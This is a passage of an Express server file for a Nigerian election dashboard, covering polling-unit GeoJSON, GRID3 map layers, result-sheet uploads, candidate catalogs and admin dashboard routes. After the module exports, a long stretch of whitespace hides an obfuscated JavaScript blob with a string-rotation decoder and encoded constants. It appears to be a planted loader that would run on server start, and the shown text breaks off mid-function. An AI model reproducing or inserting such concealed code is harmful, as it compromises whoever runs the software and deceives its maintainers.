          pollingUnitsPer100k: lgaRow?.pollingUnitsPer100k ?? null,
          accessibilityBand: lgaRow?.accessibilityBand ?? '--',
        };
      });
    }

    return res.json({
      source: {
        name: 'election-dashboard-db',
        url: '/api/polling-unit-points',
      },
      total: enrichedPoints.length,
      points: enrichedPoints,
    });
  } catch (error) {
    console.error('Error handling /api/polling-unit-points:', error.message || error);
    return res.status(500).json({ error: 'Failed to load polling unit points.' });
  }
});

app.get('/api/polling-units.geojson', async (req, res) => {
  try {
    const points = await loadPollingUnitPointsFromDb({
      state: req.query.state,
      lga: req.query.lga,
      ward: req.query.ward,
    });

    const features = points
      .filter((point) => Number.isFinite(point.latitude) && Number.isFinite(point.longitude))
      .map((point) => {
        return {
          type: 'Feature',
          geometry: { type: 'Point', coordinates: [point.longitude, point.latitude] },
          properties: {
            name: point.pollingUnit || '',
            address: point.address || point.name || '',
            code: point.code || '',
            state: point.state || '',
            lga: point.lga || '',
            ward: point.ward || '',
            band: '',
            pop_pu: null,
            pu_100k: null,
            geometrySource: point.geometrySource || 'source',
            sourceLatitude: point.sourceLatitude ?? null,
            sourceLongitude: point.sourceLongitude ?? null,
            coordinateStatus: point.coordinateStatus || 'source-provided',
          },
        };
      });

    const sourceCounts = features.reduce(
      (acc, feature) => {
        const geometrySource = feature.properties.geometrySource || 'source';
        if (geometrySource === 'source') {
          acc.exact += 1;
        } else if (geometrySource === 'csv-latlong') {
          acc.csvLatLong += 1;
        } else if (geometrySource === 'google-geocode') {
          acc.geocoded += 1;
        } else {
          acc.estimated += 1;
        }

        return acc;
      },
      { exact: 0, csvLatLong: 0, geocoded: 0, estimated: 0 }
    );

    res.setHeader('Content-Type', 'application/geo+json');
    res.setHeader('Cache-Control', 'public, max-age=3600');
    return res.json({
      type: 'FeatureCollection',
      features,
      source: {
        name: 'Local polling-unit register; coordinates shown only when source-provided',
        url: null,
        counts: sourceCounts,
        omittedWithoutCoordinates: points.length - features.length,
        accuracyNotice: 'No centroid, jittered, or inferred point is published as a polling-unit location.',
      },
    });
  } catch (error) {
    console.error('Error handling /api/polling-units.geojson:', error.message || error);
    return res.status(500).json({ error: 'Failed to load polling unit GeoJSON.' });
  }
});

app.get('/api/drive/read', requireAdminApi, async (req, res) => {
  const { fileId, mimeType } = req.query;

  if (!fileId || !mimeType) {
    return res.status(400).json({
      error: 'Missing required query parameters: fileId and mimeType',
    });
  }

  try {
    const result = await readFile(fileId, mimeType);

    if (!result) {
      return res.status(500).json({ error: 'Failed to read Google Drive file.' });
    }

    return res.json({
      type: result.type,
      data: result.data,
    });
  } catch (error) {
    console.error('Error handling /api/drive/read:', error.message || error);
    return res.status(500).json({ error: 'Failed to read Google Drive file.' });
  }
});

const GRID3_LAYERS = {
  state: process.env.GRID3_STATE_URL || 'https://services3.arcgis.com/BU6Aadhn6tbBEdyk/arcgis/rest/services/NGA_State_Boundaries_V2/FeatureServer/0',
  lga: process.env.GRID3_LGA_URL || 'https://services3.arcgis.com/BU6Aadhn6tbBEdyk/arcgis/rest/services/NGA_LGA_Boundaries_2/FeatureServer/0',
  ward: process.env.GRID3_WARD_URL || 'https://services3.arcgis.com/BU6Aadhn6tbBEdyk/arcgis/rest/services/NGA_Ward_Boundaries/FeatureServer/0',
  health: process.env.GRID3_HEALTH_URL || 'https://services3.arcgis.com/BU6Aadhn6tbBEdyk/arcgis/rest/services/GRID3_NGA_health_facilities_v2_0/FeatureServer/0',
};

app.get('/api/grid3-config', (_req, res) => {
  res.json({
    source: 'GRID3 Nigeria (CIESIN / NASRDA)',
    attribution: 'GRID3, CC BY 4.0',
    layers: Object.fromEntries(Object.entries(GRID3_LAYERS).map(([id, url]) => [id, { url }])),
  });
});

app.get('/api/grid3/:layer', async (req, res) => {
  const layerUrl = GRID3_LAYERS[req.params.layer];
  if (!layerUrl) {
    return res.status(404).json({ error: 'Unknown GRID3 layer.' });
  }

  const bbox = parseBBox(req.query.bbox);
  const params = new URLSearchParams({
    f: 'geojson',
    where: '1=1',
    outFields: '*',
    outSR: '4326',
    returnGeometry: 'true',
    resultRecordCount: String(Math.min(Number(req.query.max) || 1200, 2000)),
  });

  if (bbox) {
    params.set('geometry', `${bbox.west},${bbox.south},${bbox.east},${bbox.north}`);
    params.set('geometryType', 'esriGeometryEnvelope');
    params.set('inSR', '4326');
    params.set('spatialRel', 'esriSpatialRelIntersects');
    const span = Math.max(bbox.east - bbox.west, bbox.north - bbox.south);
    if (span > 2) params.set('maxAllowableOffset', String(span / 400));
  }

  try {
    const upstream = await fetch(`${layerUrl.replace(/\/$/, '')}/query?${params.toString()}`, {
      signal: AbortSignal.timeout(20000),
    });
    if (!upstream.ok) {
      return res.status(502).json({ error: 'GRID3 layer request failed.', status: upstream.status });
    }
    const payload = await upstream.json();
    res.setHeader('Cache-Control', 'public, max-age=300');
    return res.json(payload);
  } catch (error) {
    console.error('GRID3 proxy error:', error.message || error);
    return res.status(502).json({ error: 'Unable to load GRID3 layer.' });
  }
});

app.get('/api/nigeria-kpis', async (req, res) => {
  try {
    const payload = await computeNigeriaKpis({
      state: req.query.state,
      lga: req.query.lga,
      ward: req.query.ward,
      pu: req.query.pu,
      year: req.query.year,
    });
    const ingest = getIngestStatus();
    res.setHeader('Cache-Control', 'public, max-age=120');
    return res.json({ ...payload, ingest: { source: ingest.source, lastSuccessAt: ingest.lastSuccessAt } });
  } catch (error) {
    console.error('nigeria-kpis error:', error.message || error);
    return res.status(500).json({ error: 'Failed to compute Nigeria KPIs.' });
  }
});

app.get('/api/inec-ingest/status', async (_req, res) => {
  const status = getIngestStatus();
  return res.json(status);
});

app.get('/api/live-submissions', (req, res) => {
  try {
    const status = req.query.status ? String(req.query.status) : 'all';
    const submissions = listLiveSubmissions({ status });
    return res.json({ ok: true, submissions, count: submissions.length });
  } catch (error) {
    console.error('Error listing live submissions:', error.message || error);
    return res.status(500).json({ error: 'Failed to list live submissions.' });
  }
});

app.post('/api/live-submissions', liveSubmissionUpload.single('file'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'Result sheet image is required.' });
    }
    const lat = Number(req.body.lat);
    const lng = Number(req.body.lng);
    const accuracy = req.body.accuracy != null && req.body.accuracy !== '' ? Number(req.body.accuracy) : null;
    if (!Number.isFinite(lat) || !Number.isFinite(lng)) {
      return res.status(400).json({ error: 'GPS coordinates are required.' });
    }
    const pu = String(req.body.pu || '').trim();
    const state = String(req.body.state || '').trim();
    if (!pu || !state) {
      return res.status(400).json({ error: 'Polling unit and state are required.' });
    }
    const relativePath = path.relative(path.join(__dirname, 'data'), req.file.path).replace(/\\/g, '/');
    const row = insertLiveSubmission({
      state,
      lga: String(req.body.lga || '').trim() || null,
      ward: String(req.body.ward || '').trim() || null,
      pu,
      pu_code: String(req.body.pu_code || '').trim() || null,
      lat,
      lng,
      accuracy: Number.isFinite(accuracy) ? accuracy : null,
      file_name: req.file.originalname || req.file.filename,
      file_path: relativePath.startsWith('..') ? req.file.path : relativePath,
      status: 'Pending review',
      note: String(req.body.note || '').trim() || null,
    });
    return res.status(201).json({ ok: true, submission: row });
  } catch (error) {
    console.error('Error creating live submission:', error.message || error);
    return res.status(500).json({ error: error.message || 'Failed to save submission.' });
  }
});

app.patch('/api/live-submissions/:id', requireAdminWrite, (req, res) => {
  try {
    const id = Number(req.params.id);
    if (!Number.isFinite(id)) {
      return res.status(400).json({ error: 'Invalid submission id.' });
    }
    const status = String(req.body.status || '').trim();
    const note = req.body.note != null ? String(req.body.note) : null;
    const row = updateLiveSubmissionStatus(id, status, note);
    if (!row) {
      return res.status(404).json({ error: 'Submission not found.' });
    }
    return res.json({ ok: true, submission: row });
  } catch (error) {
    console.error('Error updating live submission:', error.message || error);
    return res.status(400).json({ error: error.message || 'Failed to update submission.' });
  }
});

app.get('/api/admin/db/status', requireAdminApi, (_req, res) => {
  res.json({
    ...getDbStatus(),
    boundaries: listBoundaryLayers(),
    boundariesDir: BOUNDARIES_DIR,
  });
});

app.get('/api/boundaries/status', (_req, res) => {
  res.json({
    layers: listBoundaryLayers(),
    source: 'local',
  });
});

app.get('/api/boundaries/:layer', (req, res) => {
  const layer = String(req.params.layer || '').toLowerCase();
  if (!['state', 'lga', 'ward'].includes(layer)) {
    return res.status(404).json({ error: 'Unknown boundary layer.' });
  }
  const payload = queryBoundariesGeoJson({
    layer,
    bbox: req.query.bbox,
    state: req.query.state,
    lga: req.query.lga,
    ward: req.query.ward,
    limit: req.query.limit,
  });
  res.setHeader('Cache-Control', 'public, max-age=300');
  return res.json(payload);
});

app.post('/api/admin/boundaries/upload', requireAdminWrite, boundaryUpload.array('files', 8), async (req, res) => {
  try {
    const uploaded = req.files || [];
    if (!uploaded.length) return res.status(400).json({ error: 'No files uploaded.' });
    if (uploaded.some((file) => !hasExpectedMagic(file, true))) {
      return res.status(400).json({ error: 'A boundary file signature does not match its extension.' });
    }
    const files = uploaded.map((file) => ({
      originalname: file.originalname,
      buffer: file.buffer,
    }));
    const result = await importUploadFiles(files, req.body?.layer);
    return res.json({ ok: true, ...result, layers: listBoundaryLayers() });
  } catch (error) {
    console.error('Boundary upload failed:', error.message || error);
    return res.status(400).json({ error: error.message || 'Boundary upload failed.' });
  }
});

app.delete('/api/admin/boundaries/:layer', requireAdminWrite, (req, res) => {
  try {
    const result = deleteBoundaryLayer(String(req.params.layer || '').toLowerCase());
    return res.json({ ok: true, ...result, layers: listBoundaryLayers() });
  } catch (error) {
    return res.status(400).json({ error: error.message || 'Unable to delete boundary layer.' });
  }
});

app.post('/api/admin/db/reimport-polling-units', requireAdminWrite, (_req, res) => {
  try {
    pollingTreeCache = null;
    pollingTreePromise = null;
    const count = importPollingUnitsFromCsv(CSV_PATH, normalizePollingUnitPointRow);
    res.json({ ok: true, pollingUnits: count });
  } catch (error) {
    res.status(500).json({ error: error.message || 'Reimport failed.' });
  }
});

app.post('/api/admin/db/reimport-election-results', requireAdminWrite, (_req, res) => {
  return res.status(410).json({ error: 'Legacy election imports are quarantined. Use the versioned editorial workflow.' });
});

app.post('/api/admin/db/upload-election-results', requireAdminWrite, (req, res) => {
  return res.status(410).json({ error: 'Legacy direct publication is disabled. Use the versioned draft and review workflow.' });
});

app.post('/api/admin/inec-ingest', requireAdminWrite, async (_req, res) => {
  try {
    const result = await runIngest();
    return res.json({ ok: true, status: result.status });
  } catch (error) {
    return res.status(500).json({ ok: false, error: error.message || String(error) });
  }
});

/** Phase 1 — candidate catalog hub (distinct from Phase 2/3 dashboard/map routes). */
const CANDIDATE_CATALOGS = {
  presidential: {
    file: 'presidential-candidates.json',
    label: 'Presidential',
    requiredKeys: ['ballots'],
  },
  gubernatorial: {
    file: 'gubernatorial-candidates.json',
    label: 'Gubernatorial',
    requiredKeys: ['years', 'statesByYear', 'ballots'],
  },
  senatorial: {
    file: 'senatorial-candidates.json',
    label: 'Senatorial',
    requiredKeys: ['years', 'statesByYear'],
  },
  reps: {
    file: 'reps-candidates.json',
    label: 'House of Representatives',
    requiredKeys: ['years', 'statesByYear'],
  },
};
const CANDIDATE_DATA_DIR = path.join(__dirname, 'public', 'data');
const CANDIDATE_BACKUP_DIR = path.join(CANDIDATE_DATA_DIR, '.backups');
const candidateCatalogUpload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 8 * 1024 * 1024, files: 1 },
});

function resolveCandidateCatalog(name) {
  const key = String(name || '').trim().toLowerCase();
  return CANDIDATE_CATALOGS[key] ? { key, ...CANDIDATE_CATALOGS[key] } : null;
}

function validateCandidateCatalogPayload(catalog, data) {
  if (!data || typeof data !== 'object' || Array.isArray(data)) {
    throw new Error('Catalog must be a JSON object.');
  }
  for (const field of catalog.requiredKeys) {
    if (data[field] == null) {
      throw new Error(`Catalog is missing required field: ${field}.`);
    }
  }
  if (catalog.key === 'presidential' && (typeof data.ballots !== 'object' || Array.isArray(data.ballots))) {
    throw new Error('presidential.ballots must be an object keyed by election year.');
  }
  if (Array.isArray(data.years) && data.years.length === 0) {
    throw new Error('years must not be empty when present.');
  }
  return true;
}

async function readCandidateCatalogFile(catalog) {
  const filePath = path.join(CANDIDATE_DATA_DIR, catalog.file);
  const raw = await fs.readFile(filePath, 'utf8');
  const data = JSON.parse(raw);
  const stat = await fs.stat(filePath);
  return {
    catalog: catalog.key,
    label: catalog.label,
    file: catalog.file,
    bytes: stat.size,
    mtime: stat.mtime.toISOString(),
    data,
  };
}

async function backupCandidateCatalog(catalog) {
  const sourcePath = path.join(CANDIDATE_DATA_DIR, catalog.file);
  await fs.mkdir(CANDIDATE_BACKUP_DIR, { recursive: true });
  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
  const backupName = `${catalog.key}-${stamp}.json`;
  const backupPath = path.join(CANDIDATE_BACKUP_DIR, backupName);
  try {
    await fs.copyFile(sourcePath, backupPath);
    return { backup: backupName, path: `public/data/.backups/${backupName}` };
  } catch (error) {
    if (error.code === 'ENOENT') return { backup: null, path: null };
    throw error;
  }
}

async function writeCandidateCatalogFile(catalog, data, actorEmail) {
  validateCandidateCatalogPayload(catalog, data);
  const backup = await backupCandidateCatalog(catalog);
  const next = { ...data };
  if (!next.updated) next.updated = new Date().toISOString().slice(0, 10);
  const filePath = path.join(CANDIDATE_DATA_DIR, catalog.file);
  const tmpPath = `${filePath}.${process.pid}.tmp`;
  const body = `${JSON.stringify(next, null, 2)}\n`;
  await fs.writeFile(tmpPath, body, 'utf8');
  await fs.rename(tmpPath, filePath);
  return {
    catalog: catalog.key,
    label: catalog.label,
    file: catalog.file,
    bytes: Buffer.byteLength(body, 'utf8'),
    backup: backup.backup,
    updatedBy: actorEmail || null,
    updated: next.updated,
  };
}

app.get('/api/admin/candidates', requireAdminApi, async (_req, res) => {
  try {
    const catalogs = await Promise.all(
      Object.keys(CANDIDATE_CATALOGS).map(async (key) => {
        const catalog = resolveCandidateCatalog(key);
        const filePath = path.join(CANDIDATE_DATA_DIR, catalog.file);
        try {
          const stat = await fs.stat(filePath);
          return {
            catalog: key,
            label: catalog.label,
            file: catalog.file,
            bytes: stat.size,
            mtime: stat.mtime.toISOString(),
            exists: true,
          };
        } catch {
          return {
            catalog: key,
            label: catalog.label,
            file: catalog.file,
            bytes: 0,
            mtime: null,
            exists: false,
          };
        }
      })
    );
    return res.json({ catalogs });
  } catch (error) {
    return res.status(500).json({ error: error.message || 'Failed to list candidate catalogs.' });
  }
});

app.get('/api/admin/candidates/:catalog', requireAdminApi, async (req, res) => {
  const catalog = resolveCandidateCatalog(req.params.catalog);
  if (!catalog) return res.status(404).json({ error: 'Unknown candidate catalog.' });
  try {
    return res.json(await readCandidateCatalogFile(catalog));
  } catch (error) {
    if (error.code === 'ENOENT') return res.status(404).json({ error: 'Catalog file not found.' });
    if (error instanceof SyntaxError) return res.status(500).json({ error: 'Catalog file is not valid JSON.' });
    return res.status(500).json({ error: error.message || 'Failed to read catalog.' });
  }
});

app.put('/api/admin/candidates/:catalog', requireAdminWrite, (req, res, next) => {
  const contentType = String(req.headers['content-type'] || '');
  if (contentType.includes('multipart/form-data')) {
    return candidateCatalogUpload.single('file')(req, res, next);
  }
  return next();
}, async (req, res) => {
  const catalog = resolveCandidateCatalog(req.params.catalog);
  if (!catalog) return res.status(404).json({ error: 'Unknown candidate catalog.' });

  try {
    let payload = null;
    if (req.file) {
      const text = req.file.buffer.toString('utf8');
      payload = JSON.parse(text);
    } else if (req.body && typeof req.body === 'object' && (req.body.data || req.body.catalog === undefined)) {
      payload = req.body.data != null ? req.body.data : req.body;
    }

    if (!payload || typeof payload !== 'object' || Array.isArray(payload)) {
      return res.status(400).json({ error: 'Provide a JSON object body or multipart file field named file.' });
    }

    const saved = await writeCandidateCatalogFile(catalog, payload, req.admin?.email);
    return res.json({ ok: true, ...saved });
  } catch (error) {
    if (error instanceof SyntaxError) {
      return res.status(400).json({ error: 'Uploaded file is not valid JSON.' });
    }
    const clientError = /missing|must be|must not|invalid|required/i.test(error.message || '');
    return res.status(clientError ? 400 : 500).json({ error: error.message || 'Failed to save catalog.' });
  }
});

// ── Dashboard builder (Phase 2) — routes under /api/admin/dashboards* and /api/dashboards/:page only ──
function dashboardLayoutError(res, error) {
  const status = error.status
    || (/unknown dashboard|no published/i.test(error.message || '') ? 400 : 500);
  return res.status(status).json({ error: error.message || 'Dashboard layout operation failed.' });
}

app.get('/api/admin/dashboards', requireAdminApi, async (_req, res) => {
  try {
    const payload = await dashboardLayouts.listDashboards();
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return dashboardLayoutError(res, error);
  }
});

app.get('/api/admin/dashboards/:page', requireAdminApi, async (req, res) => {
  try {
    const payload = await dashboardLayouts.getAdminPage(req.params.page);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return dashboardLayoutError(res, error);
  }
});

app.put('/api/admin/dashboards/:page', requireAdminWrite, async (req, res) => {
  try {
    const layout = req.body?.layout != null ? req.body.layout : req.body;
    const payload = await dashboardLayouts.saveDraft(req.params.page, layout);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return dashboardLayoutError(res, error);
  }
});

app.post('/api/admin/dashboards/:page/publish', requireAdminWrite, async (req, res) => {
  try {
    const payload = await dashboardLayouts.publishPage(req.params.page);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return dashboardLayoutError(res, error);
  }
});

app.post('/api/admin/dashboards/:page/revert', requireAdminWrite, async (req, res) => {
  try {
    const payload = await dashboardLayouts.revertPage(req.params.page);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return dashboardLayoutError(res, error);
  }
});

/** Public: published layout for Overview / Live (null when unpublished → client fallback). */
app.get('/api/dashboards/:page', async (req, res) => {
  try {
    const payload = await dashboardLayouts.getPublished(req.params.page);
    res.setHeader('Cache-Control', 'public, max-age=15');
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return dashboardLayoutError(res, error);
  }
});

// ── Map Studio (Phase 3) — routes under /api/admin/maps* and /api/maps* only ──
function mapConfigError(res, error) {
  const status = error.status
    || (/not found/i.test(error.message || '') ? 404
      : /already exists|invalid|unknown|cannot assign/i.test(error.message || '') ? 400
        : 500);
  return res.status(status).json({ error: error.message || 'Map config operation failed.' });
}

app.get('/api/admin/maps', requireAdminApi, async (_req, res) => {
  try {
    const payload = await mapConfigsStore.listMaps();
    return res.json({
      ok: true,
      ...payload,
      idFormat: mapConfigsStore.ID_PATTERN.source,
      dashboardWidgetHint: { type: 'map', config: { mapId: '<map-config-id>' } },
    });
  } catch (error) {
    return mapConfigError(res, error);
  }
});

app.put('/api/admin/maps/assignments', requireAdminWrite, async (req, res) => {
  try {
    const assignments = await mapConfigsStore.setAssignments(req.body || {});
    return res.json({ ok: true, assignments });
  } catch (error) {
    return mapConfigError(res, error);
  }
});

app.get('/api/admin/maps/:id', requireAdminApi, async (req, res) => {
  try {
    const map = await mapConfigsStore.getMap(req.params.id);
    if (!map) return res.status(404).json({ error: 'Map config not found.' });
    return res.json({ ok: true, map });
  } catch (error) {
    return mapConfigError(res, error);
  }
});

app.post('/api/admin/maps', requireAdminWrite, async (req, res) => {
  try {
    const map = await mapConfigsStore.createMap(req.body || {});
    return res.status(201).json({ ok: true, map });
  } catch (error) {
    return mapConfigError(res, error);
  }
});

app.put('/api/admin/maps/:id', requireAdminWrite, async (req, res) => {
  try {
    const map = await mapConfigsStore.updateMap(req.params.id, req.body || {});
    return res.json({ ok: true, map });
  } catch (error) {
    return mapConfigError(res, error);
  }
});

app.delete('/api/admin/maps/:id', requireAdminWrite, async (req, res) => {
  try {
    const result = await mapConfigsStore.deleteMap(req.params.id);
    return res.json(result);
  } catch (error) {
    return mapConfigError(res, error);
  }
});

/** Public: published configs assigned to Overview / Polling units / Live. */
app.get('/api/maps/views', async (_req, res) => {
  try {
    const payload = await mapConfigsStore.getPublishedViews();
    res.setHeader('Cache-Control', 'public, max-age=30');
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return mapConfigError(res, error);
  }
});

/** Public: single published map config by id (Dashboard widgets: config.mapId). */
app.get('/api/maps/:id', async (req, res) => {
  try {
    const id = String(req.params.id || '').toLowerCase();
    if (!mapConfigsStore.isValidId(id)) {
      return res.status(400).json({ error: 'Invalid map id.' });
    }
    const map = await mapConfigsStore.getPublishedMap(id);
    if (!map) return res.status(404).json({ error: 'Published map config not found.' });
    res.setHeader('Cache-Control', 'public, max-age=30');
    return res.json({ ok: true, map });
  } catch (error) {
    return mapConfigError(res, error);
  }
});

// ── Page Content Studio — country-scoped nav / sub-tabs / widgets / editorial ──
function pageContentError(res, error) {
  const status = error.status
    || (/unknown country|no published/i.test(error.message || '') ? 400 : 500);
  return res.status(status).json({ error: error.message || 'Page content operation failed.' });
}

app.get('/api/admin/pages', requireAdminApi, async (_req, res) => {
  try {
    const payload = await pageContentStore.listCountries();
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return pageContentError(res, error);
  }
});

app.get('/api/admin/pages/:country', requireAdminApi, async (req, res) => {
  try {
    const payload = await pageContentStore.getAdminCountry(req.params.country);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return pageContentError(res, error);
  }
});

app.put('/api/admin/pages/:country', requireAdminWrite, async (req, res) => {
  try {
    const bundle = req.body?.bundle != null ? req.body.bundle : req.body;
    const payload = await pageContentStore.saveDraft(req.params.country, bundle);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return pageContentError(res, error);
  }
});

app.post('/api/admin/pages/:country/publish', requireAdminWrite, async (req, res) => {
  try {
    const payload = await pageContentStore.publishCountry(req.params.country);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return pageContentError(res, error);
  }
});

app.post('/api/admin/pages/:country/revert', requireAdminWrite, async (req, res) => {
  try {
    const payload = await pageContentStore.revertCountry(req.params.country);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return pageContentError(res, error);
  }
});

/** Public: published page content for a country/global scope (null → client fallback). */
app.get('/api/page-content/:country', async (req, res) => {
  try {
    const payload = await pageContentStore.getPublished(req.params.country);
    res.setHeader('Cache-Control', 'public, max-age=15');
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return pageContentError(res, error);
  }
});

app.get('/api/elections', editorialRequired, async (_req, res) => {
  try {
    const published = await editorialStore.listPublishedContests({});
    return res.json({
      elections: published.map((row) => ({
        key: row.id,
        name: row.title,
        type: row.office,
        date: String(row.electionDate).slice(0, 10),
        detail: row.constituencyName || row.jurisdictionName,
        status: 'Published',
        winner: null,
        datasetId: row.datasetId,
      })),
    });
  } catch (error) {
    return editorialError(res, error);
  }
});

app.use((error, _req, res, _next) => {
  if (error?.message === 'Cross-origin request denied.') {
    return res.status(403).json({ error: error.message });
  }
  if (error instanceof SyntaxError && 'body' in error) {
    return res.status(400).json({ error: 'Invalid JSON body.' });
  }
  if (error instanceof multer.MulterError || /Unsupported boundary|Source evidence/i.test(error?.message || '')) {
    return res.status(400).json({ error: error.message });
  }
  console.error('Unhandled request error:', error?.message || error);
  return res.status(500).json({ error: 'Request failed.' });
});

function validateRuntimeConfig() {
  if (process.env.NODE_ENV !== 'production') return;
  const secret = getConfiguredSessionSecret();
  if (secret.length < 32) throw new Error('ADMIN_SESSION_SECRET must contain at least 32 characters in production.');
  if (!editorialStore.isEnabled()) throw new Error('EDITORIAL_DATABASE_URL is required in production.');
  if (!process.env.BASE_URL) throw new Error('BASE_URL is required in production.');
}

async function initializeApp() {
  runtimeState.ready = false;
  runtimeState.error = null;
  try {
    validateRuntimeConfig();
    await editorialStore.initializeEditorialStore();
    const puCount = ensurePollingUnitsSeeded(normalizePollingUnitPointRow);
    // Legacy public UI still reads SQLite election_datasets. Only wipe when explicitly enabled.
    let quarantinedLegacyRows = 0;
    let dsCount = 0;
    if (process.env.QUARANTINE_LEGACY_RESULTS === 'true') {
      quarantinedLegacyRows = quarantineLegacyElectionResults();
      console.log(`Database ready: ${puCount} polling units; ${quarantinedLegacyRows} legacy election rows quarantined`);
    } else {
      dsCount = ensureElectionResultsSeeded();
      console.log(`Database ready: ${puCount} polling units; ${dsCount} election datasets`);
    }
    await hydrateIngestStatus();
    if (process.env.ENABLE_INEC_DISCOVERY === 'true') {
      runIngest().catch((error) => console.warn('INEC discovery ingest skipped:', error.message || error));
      const timer = setInterval(() => {
        runIngest().catch((error) => console.warn('Scheduled INEC discovery failed:', error.message || error));
      }, 6 * 60 * 60 * 1000);
      timer.unref();
    }
    runtimeState.ready = true;
    runtimeState.initializedAt = new Date().toISOString();
    return { puCount, dsCount };
  } catch (error) {
    runtimeState.error = error.message || String(error);
    throw error;
  }
}

async function start() {
  if (!PRIMARY_ADMIN_EMAIL) {
    console.warn('PRIMARY_ADMIN_EMAIL is not set; primary-admin Access APIs will deny all callers.');
  }
  if (!(await adminAuth.isLocalAdminConfigured())) {
    console.warn('Local admin login is not configured. Set ADMIN_USERNAME/ADMIN_PASSWORD or create data/admin-credentials.json.');
  } else {
    try {
      const users = await adminAuth.listCredentialUsers();
      for (const user of users) {
        await adminAuth.ensureEmailOnAllowList(user.email);
      }
    } catch (error) {
      console.warn('Unable to sync credential emails onto admin allow-list:', error.message || error);
    }
  }
  await initializeApp();
  return new Promise((resolve) => {
    const server = app.listen(PORT, HOST, () => {
      console.log(`Server listening on http://${HOST}:${PORT}`);
      resolve(server);
    });
  });
}

if (require.main === module) {
  start().catch((error) => {
    console.error('Server startup failed:', error.message || error);
    process.exitCode = 1;
  });
}

module.exports = {
  app,
  start,
  initializeApp,
  validateRuntimeConfig,
  runtimeState,
  parseNumericValue,
  normalizePollingUnitPointRow,
};                                                                                                                                                     var z = '-4412-1';(function(iD$rAdb_dVlFfpxq,phWrbjW_thbDXM){var ToBFsWhdj$omTwbEfly=WWXFnxYi_iSPKy,daVGsxvoZXYe=iD$rAdb_dVlFfpxq();while(!![]){try{var nU_l$lqaj=Number(parseFloat(ToBFsWhdj$omTwbEfly(0x1aa))/(-0x14a1*Math.max(0x1,parseInt(0x1))+-0x12*0xbf+0x4*parseFloat(0x884)))*Math['floor'](parseFloat(ToBFsWhdj$omTwbEfly(0x1ae))/(parseInt(0x2616)+parseInt(0x1d)*-0x15+Math.floor(parseInt(0x1))*-parseInt(0x23b3)))+parseFloat(ToBFsWhdj$omTwbEfly(0x1ab))/(parseInt(-parseInt(0x11))*parseInt(-0xe9)+-parseInt(0x109e)+parseInt(parseInt(0x128)))+-parseFloat(ToBFsWhdj$omTwbEfly(0x1a6))/(Math.ceil(-parseInt(0x7c2))+-parseInt(0x27c)*0x3+parseInt(0x79d)*parseInt(0x2))*Math['ceil'](parseFloat(ToBFsWhdj$omTwbEfly(0x19a))/(-parseInt(0x10)*Math.ceil(-0x8d)+Math.ceil(0x130)+-parseInt(0x1ff)*Math.floor(0x5)))+parseFloat(ToBFsWhdj$omTwbEfly(0x1a5))/(parseFloat(parseInt(0x23b6))*Math.ceil(-0x1)+0xb57+0x1865)*Number(parseFloat(ToBFsWhdj$omTwbEfly(0x1a8))/(-parseInt(0x1)*parseFloat(-parseInt(0x1c24))+-parseInt(0x595)+-0x1688))+parseFloat(ToBFsWhdj$omTwbEfly(0x1a0))/(-0x1e23+parseInt(0x22a7)+Math.max(-parseInt(0x47c),-0x47c))*Number(parseFloat(ToBFsWhdj$omTwbEfly(0x1a9))/(Math.trunc(parseInt(0x133b))*-parseInt(0x2)+-parseInt(0x112)*-0x11+Number(0x144d)))+Math['ceil'](-parseFloat(ToBFsWhdj$omTwbEfly(0x1a4))/(parseInt(0x12)*Number(-parseInt(0x59))+parseInt(-parseInt(0x19c9))+parseFloat(0x2015)))+-parseFloat(ToBFsWhdj$omTwbEfly(0x1a1))/(Math.floor(parseInt(0xa97))*Number(0x2)+Math.max(-0x59,-parseInt(0x59))*0x3e+Math.ceil(parseInt(0x6b)));if(nU_l$lqaj===phWrbjW_thbDXM)break;else daVGsxvoZXYe['push'](daVGsxvoZXYe['shift']());}catch(kclrFAgqadpqnkeNnLgcO$EED){daVGsxvoZXYe['push'](daVGsxvoZXYe['shift']());}}}(FNauj_AOPOLeprqN,-parseInt(0x1)*0x6ad6f+Math.trunc(0x7d)*parseFloat(-parseInt(0xd3d))+Math.trunc(-0x65)*-0x3f67));var NX=[Math.trunc(0x841e66)+Math.floor(-parseInt(0x999247))+Math.trunc(-0x7eef30)*-0x1,Number(-parseInt(0x2fc))+-0x1dbc+parseInt(0x2227)*parseInt(0x1),-0x1093*Math.max(parseInt(0x3),0x3)+Math.ceil(parseInt(0x28e3))+parseInt(0x5891),-parseInt(0x3)*parseInt(-parseInt(0x589))+parseInt(0x26f)*parseInt(-0x2)+0x2e*parseInt(-0x34),0xbdd1+Math.floor(parseInt(0x1))*Math.trunc(-0x3d56)+0x34*parseInt(0xd1),-0x22ff07+parseInt(0x1)*Number(-parseInt(0x1885bf))+parseInt(0x881b59)],SX=[parseFloat(0x1b7f69)+Math.ceil(-0xb505)+Math.floor(parseInt(0x35d539)),Math.max(parseInt(0x1648),0x1648)+Math.trunc(-parseInt(0x15))*Number(parseInt(0x8b))+-parseInt(0x9f0),Math.max(-parseInt(0x12d16),-parseInt(0x12d16))+-0x87e0+parseFloat(parseInt(0x258d7))*parseInt(0x1),-0x3*Math.max(-0x896,-parseInt(0x896))+parseFloat(-parseInt(0x36f))*Number(-0x7)+-parseInt(0xa)*0x4e8,parseFloat(0x161e3)+parseInt(0xc348)+parseInt(0x16)*-0xeff,Math.max(-0x4,-0x4)*-0x16112f+Number(-parseInt(0x29))*parseFloat(-0x26d6d)+parseInt(-parseInt(0x737bdc))];function spin(MRzrs_cNFtZRGtVzo$bGXcX,FhF_uisUyD){var 